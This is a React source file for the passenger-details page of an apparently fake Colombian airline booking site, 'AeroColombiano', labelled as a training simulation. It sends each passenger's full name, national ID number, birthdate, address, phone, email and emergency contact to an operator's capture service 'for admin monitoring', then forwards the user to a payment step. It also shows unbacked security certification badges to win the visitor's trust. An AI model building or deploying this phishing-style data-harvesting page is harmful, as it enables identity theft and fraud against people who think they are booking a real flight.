import React, { useState, useEffect } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { trainingService } from '../../services/trainingService';
import ContextualBrandHeader from '../../components/ui/ContextualBrandHeader';
import SimulationProgressIndicator from '../../components/ui/SimulationProgressIndicator';
import PassengerForm from './components/PassengerForm';
import FlightSummaryCard from './components/FlightSummaryCard';
import ProgressSteps from './components/ProgressSteps';
import SecurityNotice from './components/SecurityNotice';

const PassengerInformation = () => {
  const navigate = useNavigate();
  const location = useLocation();
  
  // Get data from previous steps with validation
  const searchData = location?.state?.searchData || {
    from: 'Bogotá',
    to: 'Medellín',
    passengers: { adults: 1, children: 0, infants: 0, total: 1 },
    departureDate: '2024-12-15',
    tripType: 'one-way'
  };

  const selectedFlight = location?.state?.selectedFlight || {
    aerolinea: 'AeroColombiano',
    numeroVuelo: 'AC-1234',
    origen: `${searchData?.from} (${searchData?.from?.includes('BOG') ? 'BOG' : 'BOG'})`,
    destino: `${searchData?.to} (${searchData?.to?.includes('MDE') ? 'MDE' : 'MDE'})`,
    fechaIda: searchData?.departureDate,
    horaSalida: '14:30',
    horaLlegada: '16:15',
    duracion: '1h 45m',
    precio: 380000 * searchData?.passengers?.total,
    pasajeros: searchData?.passengers?.total,
    clase: 'Económica'
  };

  const [currentPassenger, setCurrentPassenger] = useState(1);
  const [totalPassengers] = useState(searchData?.passengers?.total || 1);
  const [sessionId, setSessionId] = useState(location?.state?.sessionId);
  const [passengerDataList, setPassengerDataList] = useState({});
  const [loading, setLoading] = useState(false);

  // Get session from storage if not passed
  useEffect(() => {
    if (!sessionId) {
      const storedSessionId = sessionStorage.getItem('trainingSessionId');
      if (storedSessionId) {
        setSessionId(storedSessionId);
      }
    }
  }, [sessionId]);

  // Update session when component mounts
  useEffect(() => {
    const updateSessionForPassengerPage = async () => {
      try {
        const currentSession = trainingService?.getCurrentSession();
        
        if (currentSession?.sessionId) {
          // Update session progress to passenger information step
          await trainingService?.updateSessionProgress(
            currentSession?.sessionId,
            3, // Current step: passenger information
            6  // Total steps
          );

          // Capture page entry
          await trainingService?.captureData(
            currentSession?.sessionId,
            'page_visited',
            'passenger-information',
            3,
            false
          );

          // Update session activity
          await trainingService?.updateAnonymousSessionActivity(
            currentSession?.sessionId,
            { 
              current_page: 'passenger-information',
              step_progress: 3,
              last_interaction: new Date()?.toISOString()
            }
          );
        }
      } catch (error) {
        console.log('Session update in educational mode:', error);
      }
    };

    updateSessionForPassengerPage();
  }, []);

  const handlePassengerSubmit = async (passengerData) => {
    try {
      setLoading(true);

      // Store passenger data with proper indexing
      const updatedPassengerData = {
        ...passengerDataList,
        [currentPassenger]: {
          ...passengerData,
          passengerNumber: currentPassenger,
          isMainPassenger: currentPassenger === 1
        }
      };
      setPassengerDataList(updatedPassengerData);

      // Capture data for admin monitoring with consistent field names
      if (sessionId && sessionId?.startsWith('train_')) {
        const captureData = {
          [`passenger_${currentPassenger}_full_name`]: `${passengerData?.nombres} ${passengerData?.apellidos}`,
          [`passenger_${currentPassenger}_id_type`]: passengerData?.tipoIdentificacion,
          [`passenger_${currentPassenger}_id_number`]: passengerData?.numeroIdentificacion,
          [`passenger_${currentPassenger}_birthdate`]: passengerData?.fechaNacimiento,
          [`passenger_${currentPassenger}_gender`]: passengerData?.genero,
          [`passenger_${currentPassenger}_email`]: passengerData?.email,
          [`passenger_${currentPassenger}_phone`]: passengerData?.telefono,
          [`passenger_${currentPassenger}_country`]: passengerData?.paisResidencia,
          [`passenger_${currentPassenger}_address`]: passengerData?.direccion,
          [`passenger_${currentPassenger}_emergency_contact`]: passengerData?.contactoEmergenciaNombre,
          [`passenger_${currentPassenger}_emergency_phone`]: passengerData?.contactoEmergenciaTelefono,
          form_step: 3
        };

        try {
          await trainingService?.captureFormData(sessionId, captureData);
        } catch (captureError) {
          console.log('Passenger data capture simulation:', captureData);
        }
      }

      // Check if we have more passengers
      if (currentPassenger < totalPassengers) {
        setCurrentPassenger(currentPassenger + 1);
      } else {
        // All passengers completed, navigate to billing with complete data
        navigate('/billing-and-payment', {
          state: {
            searchData: searchData,
            selectedFlight: selectedFlight,
            passengers: updatedPassengerData,
            sessionId: sessionId,
            totalPassengers: totalPassengers
          }
        });
      }
    } catch (error) {
      console.error('Error processing passenger data:', error);
      
      // Still navigate even if capture fails (for educational simulation)
      if (currentPassenger < totalPassengers) {
        setCurrentPassenger(currentPassenger + 1);
      } else {
        navigate('/billing-and-payment', {
          state: {
            searchData: searchData,
            selectedFlight: selectedFlight,
            passengers: passengerDataList,
            sessionId: sessionId,
            totalPassengers: totalPassengers
          }
        });
      }
    } finally {
      setLoading(false);
    }
  };

  const handleBack = () => {
    if (currentPassenger > 1) {
      setCurrentPassenger(currentPassenger - 1);
    } else {
      navigate('/flight-results-selection', {
        state: { searchData }
      });
    }
  };

  return (
    <div className="min-h-screen bg-background">
      {/* Header */}
      <ContextualBrandHeader userRole="simulation" simulationStage="passenger-info" />
      {/* Progress Indicator */}
      <SimulationProgressIndicator currentStep={3} />
      {/* Main Content */}
      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
        <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
          {/* Main Form Column */}
          <div className="lg:col-span-2">
            {/* Page Header with ACTUAL passenger counts */}
            <div className="mb-6">
              <h1 className="text-2xl md:text-3xl font-heading font-bold text-secondary mb-2">
                Información del Pasajero {currentPassenger} de {totalPassengers}
              </h1>
              <p className="text-text-secondary">
                Complete los datos requeridos para el pasajero {currentPassenger}. 
                Asegúrese de que la información coincida exactamente con sus documentos de identidad.
              </p>
              
              {/* Flight consistency display */}
              <div className="mt-4 p-3 bg-blue-50 border border-blue-200 rounded-lg">
                <p className="text-sm text-blue-800">
                  <strong>Vuelo:</strong> {selectedFlight?.origen} → {selectedFlight?.destino} • 
                  <strong> Fecha:</strong> {selectedFlight?.fechaIda} • 
                  <strong> Pasajeros:</strong> {totalPassengers} • 
                  <strong> Total:</strong> ${selectedFlight?.precio?.toLocaleString('es-CO')}
                </p>
              </div>
            </div>

            {/* Progress Steps */}
            <ProgressSteps currentStep={3} />

            {/* Security Notice */}
            <SecurityNotice />

            {/* Passenger Form */}
            <PassengerForm
              onSubmit={handlePassengerSubmit}
              onBack={handleBack}
              passengerData={passengerDataList?.[currentPassenger] || {
                nombres: '',
                apellidos: '',
                tipoIdentificacion: 'cedula',
                numeroIdentificacion: '',
                fechaNacimiento: '',
                genero: '',
                email: '',
                telefono: '',
                paisResidencia: 'colombia',
                direccion: '',
                contactoEmergenciaNombre: '',
                contactoEmergenciaTelefono: '',
                contactoEmergenciaRelacion: '',
                contactoEmergenciaEmail: ''
              }}
              setPassengerData={(data) => {
                setPassengerDataList(prev => ({
                  ...prev,
                  [currentPassenger]: data
                }));
              }}
              passengerNumber={currentPassenger}
              totalPassengers={totalPassengers}
              loading={loading}
            />
          </div>

          {/* Sidebar */}
          <div className="lg:col-span-1">
            <div className="sticky top-24 space-y-6">
              {/* Flight Summary with ACTUAL data */}
              <FlightSummaryCard 
                flightData={selectedFlight}
                searchData={searchData}
              />

              {/* Passenger Progress */}
              <div className="bg-surface border border-border rounded-card p-4">
                <h3 className="text-lg font-heading font-semibold text-secondary mb-3">
                  Progreso de Pasajeros ({Object.keys(passengerDataList)?.length}/{totalPassengers} completados)
                </h3>
                <div className="space-y-2">
                  {Array.from({length: totalPassengers}, (_, index) => {
                    const passengerNum = index + 1;
                    const isCompleted = passengerDataList?.[passengerNum]?.nombres;
                    const isCurrent = passengerNum === currentPassenger;
                    
                    return (
                      <div key={passengerNum} className={`flex items-center p-2 rounded ${
                        isCurrent ? 'bg-primary/10 border border-primary/20' : 
                        isCompleted ? 'bg-green-50 border border-green-200': 'bg-gray-50 border border-gray-200'
                      }`}>
                        <div className={`w-6 h-6 rounded-full flex items-center justify-center text-sm font-medium mr-3 ${
                          isCompleted ? 'bg-green-500 text-white' : isCurrent ?'bg-primary text-white': 'bg-gray-300 text-gray-600'
                        }`}>
                          {isCompleted ? '✓' : passengerNum}
                        </div>
                        <div>
                          <p className="font-medium text-sm">
                            Pasajero {passengerNum}
                            {isCurrent && <span className="text-primary"> (Actual)</span>}
                            {passengerNum === 1 && <span className="text-blue-600"> (Principal)</span>}
                          </p>
                          {isCompleted && (
                            <p className="text-xs text-gray-600">
                              {passengerDataList?.[passengerNum]?.nombres} {passengerDataList?.[passengerNum]?.apellidos}
                            </p>
                          )}
                        </div>
                      </div>
                    );
                  })}
                </div>
              </div>

              {/* Help Section */}
              <div className="bg-surface border border-border rounded-card p-4">
                <h3 className="text-lg font-heading font-semibold text-secondary mb-3">
                  ¿Necesita Ayuda?
                </h3>
                <div className="space-y-3 text-sm">
                  <div className="flex items-center text-text-secondary">
                    <span className="w-2 h-2 bg-primary rounded-full mr-2"></span>
                    Línea de atención: 01 8000 123 456
                  </div>
                  <div className="flex items-center text-text-secondary">
                    <span className="w-2 h-2 bg-primary rounded-full mr-2"></span>
                    Chat en línea disponible 24/7
                  </div>
                  <div className="flex items-center text-text-secondary">
                    <span className="w-2 h-2 bg-primary rounded-full mr-2"></span>
                    Email: soporte@aerocolombiano.com
                  </div>
                </div>
              </div>

              {/* Trust Signals */}
              <div className="bg-surface border border-border rounded-card p-4">
                <h3 className="text-sm font-heading font-semibold text-secondary mb-3">
                  Certificaciones de Seguridad
                </h3>
                <div className="grid grid-cols-2 gap-3">
                  <div className="text-center p-2 bg-muted/50 rounded-md">
                    <div className="text-xs font-medium text-text-primary">SSL</div>
                    <div className="text-xs text-text-secondary">Certificado</div>
                  </div>
                  <div className="text-center p-2 bg-muted/50 rounded-md">
                    <div className="text-xs font-medium text-text-primary">PCI DSS</div>
                    <div className="text-xs text-text-secondary">Cumplimiento</div>
                  </div>
                  <div className="text-center p-2 bg-muted/50 rounded-md">
                    <div className="text-xs font-medium text-text-primary">ISO 27001</div>
                    <div className="text-xs text-text-secondary">Certificado</div>
                  </div>
                  <div className="text-center p-2 bg-muted/50 rounded-md">
                    <div className="text-xs font-medium text-text-primary">GDPR</div>
                    <div className="text-xs text-text-secondary">Cumplimiento</div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default PassengerInformation;